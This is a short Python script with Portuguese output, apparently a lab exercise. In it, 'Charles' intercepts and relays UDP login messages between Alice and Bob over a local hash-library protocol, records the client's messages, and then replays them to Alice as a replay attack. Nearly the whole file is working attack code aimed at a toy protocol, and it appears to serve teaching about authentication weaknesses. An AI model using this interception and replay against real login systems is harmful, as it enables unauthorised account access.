import socket
import MyHashLib as HL

def EavesDropping(cliente, servidor):
    global alice, bob

    while True:   
        data, addr = s.recvfrom(1024) 
        msg = HL.separaMensagem(data)

        if msg[0] == 'HELLO':
            bob = addr
            print(f'Descobri o Endereço de Bob {bob}')
        elif msg[0] == 'SALGAR_SENHA':
            alice = addr
            print(f'Descobri o Endereço de Alice {alice}')


        if addr == bob: 
            print('ESCUTEI BOB: ', msg)
            cliente.append(data)  
            # repassa a mensagem para ALICE
            s.sendto(data, HL.ALICE)
        else:
            print('ESCUTEI ALICE: ', msg)
            servidor.append(data)
            # repassa a mensagem para BOB
            s.sendto(data, bob)

        if msg[0] == 'SUCCESS':
            break

        if msg[0] == 'FAILURE':
            cliente = []
            servidor = []
            print('O login falhou, reiniciando a escuta')

        

def ReplayAttack(cliente, servidor):

    print('Fazendo REPLAY ATTACK contra ALICE')
    for m in cliente:
        s.sendto(m, alice)
        print('Enviei: ', m)
        data, _ = s.recvfrom(1024)
        msg = HL.separaMensagem(data)
        print('Recebi: ', msg)

    try:
        s.settimeout(5)
        print('Aguardando mais mensagens: ')
        data, _ = s.recvfrom(1024)
        msg = HL.separaMensagem(data)
        print('Recebi: ', msg)
    except:
        print('A conversa encerrou')
    finally:
        s.settimeout(None)
   

while True:
    print('ESTA TELA PERTENCE A CHARLES')

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind(HL.CHARLES)

    cliente = []
    servidor = []

    bob = None
    alice = None

    print('Iniciando escuta ...')
    EavesDropping(cliente, servidor)
    input('Digite <ENTER> para fazer o REPLAY ATTACK')
    ReplayAttack(cliente, servidor)







